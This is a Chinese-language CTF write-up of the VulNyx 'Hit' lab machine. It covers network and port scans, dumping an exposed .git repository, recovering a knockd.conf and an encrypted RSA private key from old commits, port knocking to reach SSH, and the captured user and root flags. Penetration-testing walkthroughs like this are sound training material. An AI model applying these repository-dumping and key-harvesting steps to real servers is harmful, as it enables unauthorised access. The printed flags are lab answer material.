---
title: VulNyx Hit靶机复盘
author: LingMj
data: 2025-02-04
categories: [VulNyx]
tags: [git,log]
description: 难度-Easy
---

## 网段扫描
```
root@LingMj:/home/lingmj# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.1    00:50:56:c0:00:08       (Unknown)
192.168.26.2    00:50:56:e8:d4:e1       (Unknown)
192.168.26.204  00:0c:29:df:3e:6d       (Unknown)
192.168.26.254  00:50:56:f4:1c:e5       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.850 seconds (138.38 hosts/sec). 4 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj# nmap -p- -sC -sV 192.168.26.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 07:03 EST
Nmap scan report for 192.168.26.204 (192.168.26.204)
Host is up (0.0019s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.22.1
|_http-title: Site doesn't have a title (text/html).
| http-git: 
|   192.168.26.204:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Commit #5 
|_http-server-header: nginx/1.22.1
MAC Address: 00:0C:29:DF:3E:6D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.99 seconds
```

## 获取webshell
![图 0](../assets/images/a842cc37955992418a974ee9b0eff420ad43ef10e18c56d86eb2a65ec70916a6.png)  
![图 1](../assets/images/cdbd5cbf11cfb494d1614047850225c88a872ef827cd4b9423f243b55b9b1edb.png)  

>是git
>
![图 2](../assets/images/11d432a47c49c82d7dd892f9149829077046cea9837e8d4a912c86c93d78cc8a.png)  
![图 3](../assets/images/eed8a8613a223981b698f24c9b992450eb1c82050b21db3a6455034792ee4c37.png)  
![图 4](../assets/images/0181eb411818c75fb67ec8ca47ff2300fae9c408738c5076f6adffab7e40b20a.png)  
![图 5](../assets/images/0c9897bcb3de5fd3b1d8aa593b0dc28eb16217fffc369d5a295125fc5505cd53.png)  
![图 6](../assets/images/7d1a40ba84918cdec0b35337f728dce352060cbed0a8436e09531cbaef0d64fd.png)  

```
从你提供的 git log 输出来看，这是一个 Git 仓库的提交历史记录，显示了最近的几次提交。以下是对这些信息的解读：
提交记录
最新提交
提交哈希值：2b5a747
分支：HEAD 和 master，表示当前工作目录指向的是 master 分支。
提交信息：Commit #5，这是第 5 次提交。
其他提交
7dff168：第 4 次提交，提交信息为 Commit #4。
a998093：第 3 次提交，提交信息为 Commit #3。
0cf5be4：第 2 次提交，提交信息为 Commit #2。
9ca5eed：第 1 次提交，提交信息为 Commit #1。
目录结构
从路径来看：
当前工作目录是 /home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204。
这个目录可能是一个 Git 仓库的某个子目录，具体用途需要结合项目背景来判断。
可能的操作
如果你需要进一步操作这个 Git 仓库，可以尝试以下命令：
查看详细提交信息
bash复制
git log -1 2b5a747
这会显示最后一次提交的详细信息，包括提交者、提交时间、修改的文件等。
查看文件差异
bash复制
git diff 9ca5eed 2b5a747
这会显示从第一次提交到最近一次提交的文件差异。
切换到其他提交
bash复制
git checkout 9ca5eed
这会将工作目录切换到第一次提交的状态。
如果你有其他具体需求，可以告诉我，我会进一步帮助你！
```


![图 7](../assets/images/c37d9930d6badad45b1b2de63b212c23add86929bb51a98f5fef4bc3167393d1.png)  
![图 8](../assets/images/a79519b00a00ed18ec55b3a2fe87cc4e0965850f3b3d70daf9ea212396412429.png)  
![图 9](../assets/images/ea336a506917cd79f6a3bb6189988fab0027382015e4cf0cdff03aad76a9efb1.png)  


```
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cd /home/lingmj/xxoo                                    
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# knock 192.168.26.204 7000 8000 9000
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# nmap -p- 192.168.26.204                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 08:00 EST
Nmap scan report for hit.nyx (192.168.26.204)
Host is up (0.0022s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:DF:3E:6D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 27.81 seconds
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# knock 192.168.26.204 9000 8000 7000
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# nmap -p- 192.168.26.204            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 08:01 EST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 8.42% done; ETC: 08:02 (0:00:43 remaining)

                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# nmap -p22 -sC -sV  192.168.26.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 08:02 EST
Nmap scan report for hit.nyx (192.168.26.204)
Host is up (0.0019s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
MAC Address: 00:0C:29:DF:3E:6D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# knock 192.168.26.204 12345 54321 24680 13579
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# nmap -p22 -sC -sV  192.168.26.204           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 08:02 EST
Nmap scan report for hit.nyx (192.168.26.204)
Host is up (0.0023s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
MAC Address: 00:0C:29:DF:3E:6D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo# cd /home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb  4 07:59 .
drwxr-xr-x 7 root root 4096 Feb  4 07:13 ..
drwxr-xr-x 8 root root 4096 Feb  4 07:59 .git
-rw-r--r-- 1 root root 2590 Feb  4 07:59 id_rsa
-rw-r--r-- 1 root root  489 Feb  4 07:59 knockd.conf
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# git checkout 9ca5eed
Previous HEAD position was 7dff168 Commit #4
HEAD is now at 9ca5eed Commit #1
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb  4 07:59 .
drwxr-xr-x 7 root root 4096 Feb  4 07:13 ..
drwxr-xr-x 8 root root 4096 Feb  4 08:07 .git
-rw-r--r-- 1 root root 2590 Feb  4 07:59 id_rsa
-rw-r--r-- 1 root root  489 Feb  4 07:59 knockd.conf
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cat knockd.conf                                         
[options]
        UseSyslog

[openSSH]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[openHTTPS]
        sequence    = 12345,54321,24680,13579
        seq_timeout = 5
        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
        tcpflags    = syn
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# git checkout 0cf5be4
Previous HEAD position was 9ca5eed Commit #1
HEAD is now at 0cf5be4 Commit #2
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb  4 08:08 .
drwxr-xr-x 7 root root 4096 Feb  4 07:13 ..
drwxr-xr-x 8 root root 4096 Feb  4 08:08 .git
-rw-r--r-- 1 root root 2592 Feb  4 08:08 id_rsa
-rw-r--r-- 1 root root  491 Feb  4 08:08 knockd.conf
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cat knockd.conf 
[options]
        UseSyslog

[openSSH]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[openHTTPS]
        sequence    = 12345,54321,24680,13579
        seq_timeout = 5
        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
        tcpflags    = syn


                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# git checkout a998093
Previous HEAD position was 0cf5be4 Commit #2
HEAD is now at a998093 Commit #3
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb  4 08:08 .
drwxr-xr-x 7 root root 4096 Feb  4 07:13 ..
drwxr-xr-x 8 root root 4096 Feb  4 08:08 .git
-rw-r--r-- 1 root root 1743 Feb  4 08:08 id_rsa
-rw-r--r-- 1 root root  163 Feb  4 08:08 knockd.conf
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# git checkout 7dff168
Previous HEAD position was a998093 Commit #3
HEAD is now at 7dff168 Commit #4
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# ls -al
total 20
drwxr-xr-x 3 root root 4096 Feb  4 08:09 .
drwxr-xr-x 7 root root 4096 Feb  4 07:13 ..
drwxr-xr-x 8 root root 4096 Feb  4 08:09 .git
-rw-r--r-- 1 root root 2590 Feb  4 08:09 id_rsa
-rw-r--r-- 1 root root  489 Feb  4 08:09 knockd.conf
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cat knockd.conf 
[options]
        UseSyslog

[openSSH]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[openHTTPS]
        sequence    = 12345,54321,24680,13579
        seq_timeout = 5
        command     = /usr/local/sbin/knock_add -i -c INPUT -p tcp -d 443 -f %IP%
        tcpflags    = syn
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# knock 192.168.26.204 7000 8000 9000        
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# knock 192.168.26.204 7000 8000 9000
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# knock 192.168.26.204 7000 8000 9000
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# nmap -p22 -sC -sV  192.168.26.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 08:09 EST
Nmap scan report for hit.nyx (192.168.26.204)
Host is up (0.0021s latency).

PORT   STATE  SERVICE VERSION
22/tcp closed ssh
MAC Address: 00:0C:29:DF:3E:6D (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# git checkout a998093               
Previous HEAD position was 7dff168 Commit #4
HEAD is now at a998093 Commit #3
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cat knockd.conf 
[options]
        LogFile = /var/log/knockd.log

[openSSH]
        sequence    = 65535,8888,54111
        seq_timeout = 1
        command     = /usr/sbin/service ssh start
        tcpflags    = syn
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# cat id_rsa     
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,3E2B3558346EF63A

6ba1VKUz/cNss0/xw7FkmsfiG15ExhqArUxI7WCfiFKNaeuSdUNETexm38BmeC/b
kmKErTAVzIpCtzCxXYEO8wOOyJRJEZGHNqtoq6bgrxcZaJfzONc1EM6aEIfQS+Ks
zloh5Ye8FygCkU2bCSYnaLwyHuGUcJ72Oa+8jYJtsvr1Gd+z0CWJapRodsYnlvep
5EGx+jaYDkOG3VEtvjfPvA+pezHPifDsLr03JNuGb4awvpTGoRqXjXSYSfKOKimy
Jpip4JVxit3T9aaOu1wF5UIExRtTG9lj38Mb1H2zXENcONIX5nAPoacvvZtCp9iz
20qafBdLgnvZF0sy9GEvjouXPNeAk/c19qTvAu6lSsQq0NliIcozN8tLyvNHUjPv
s/BptewE2NK0YvkNNCNhTilVMPaaojhf8zIVqNeH3L99GBUjigNdd2kqYzX4CjG/
7W8WLhl8gPDeM7eI+Tc94dRRopDfQxMkl/ZhpecXTQQj8Ay8kdSJ+788geA2ySUe
eeeBZ2XZk1X73yoqE1n7mQfvoJwtQWsCATQvMZrVlAJv5XYzIQrtKsGmfv18FehN
TosfUBrvqprm2093NHqgKsgZy12reQt8ZnQiusWiY4ozOQxLJnn6SnE2pSkNhOTj
3Zi8x1WCH6qSOKREBnOZjWZJm4J8UgfqU3CpXKLaYDwPSSVjdHHX2D8m0yypxZGb
7yP27mDSEgm2NxKbbesfEehqA+U3HvJClq9dgXYK14Phj6DRO8xDLBsP3GdlzZSB
g2gIObMasB7lJl1zpre0FgP/Ee98xYwFSvu6nuHvfaEC++XXjJBI9xnAe23Bmlam
7MIuk2eD+3R39skT5Sh5B8O/N2geMXL2G08QOLw5Yr5zvi8nNw1CkCO9saRf5x0x
cfQfTQjGzwC/V0JvNtCZg8FDUlXeqoAd/skbZAmLNiFaNwQ2irOQmZvdmH/Zp23X
HDKecWcpLhaa9xbbua84QMoP2lDm4NFLbPPxkG35kCW0qKGymWmqlZhkDiVoBdUJ
psubanx2bCiCDHSoPGJq/4WW9agBuHd9POP3f1OJtDsgesJrZTUewomSDv5Vc039
1PZI8qYCJIgojtlB0A7HFf/fJGSUjm5OmomDLi18HnTg6SiiEnmKtBtI7RkVkGSc
6l+8RgddRFRY7/SmLUqEtLcgjjqFqT1yeKZAFxpGVxJh3c9eY0KNDbbnksPxV6B/
Ogop0/2UWyQSudzhuDmPuXTHA8ZCohhl3S1RKzp0vnvZGyd83wbk427YrImnUqBh
jMvFoMe664v6NwCvGk0H4oT5pz8guPH7EhnNGAYHQ65JtiAmn60fqqjF11mPN2mG
z08EKhIsUZcYzl6zXelvKtI8oCPay7DAVh2YUVTCuXO0+ulaCrbhC4imvFTZflqP
V1DUAhrK0WhvT97rnh7yI3cAO24Kp3dI0on7wB7OxV0NhbzypT3V9IJmOBbgXWW9
TCG+r1FGBHQ6ywjmAeIGF3iui1MnU/TRbY7Zs0sqMZ3iT2jF8qNmfl0YhRtgXM9+
o82sn1CEU4rITslU3qUHA5/yiFVRPuL48mbjTNbkLvzFfMQ/3ePdhg==
-----END RSA PRIVATE KEY-----
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# knock 192.168.26.204 65535,8888 54111
Failed to resolve hostname '192.168.26.204' on port 65535,8888
getaddrinfo: Servname not supported for ai_socktype
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# knock 192.168.26.204 65535 8888 54111
                                                                                                                                                                                                                
root@LingMj:/home/lingmj/xxoo1/GitHack-master/dist/192.168.26.204# 
```

![图 10](../assets/images/5e578884f2defed68a36085bf1bc35fec6bd39cdddb833551f0420a07e796b99.png)  

![图 11](../assets/images/831b462284a3991aa106cf6312fa4e3845b362c80208a5075b9ad7e5421ac492.png)  


## 提权
![图 12](../assets/images/a8f937cd93c2c1178e7a60b55561871f58f6bc29d3964d1168d229c80eebc7a2.png)  
![图 13](../assets/images/44143737906e22f15506573f3448be7b0cb973d6f1967ab8586913d29cb577e5.png)  
![图 14](../assets/images/1fe93ee62777d8bd73fafe1890ba7a69c8a543b41e9b0afda0fea168bee609f0.png)  
![图 15](../assets/images/086bd3db489c80490145c3d8b4fcc315a3c770e3fad906aeb929be2dee20b7e1.png)  
![图 16](../assets/images/7da0940037b394be5011a25a3c7a737f8e3a90d17b339843cc695837f41e8ca4.png)  

>这里说明一下需要进行更改的应用程序最好用virtualbox，不是vmware
>
![图 17](../assets/images/685fcc8ffcd4d3cd3e3002ec531f14f3b48d822013654658be49bf751aa09916.png)  



>userflag:21744d4a65af82ac691cb3381c033d37
>
>rootflag:f4b9848754562bfeffbeb8cc8257048c
>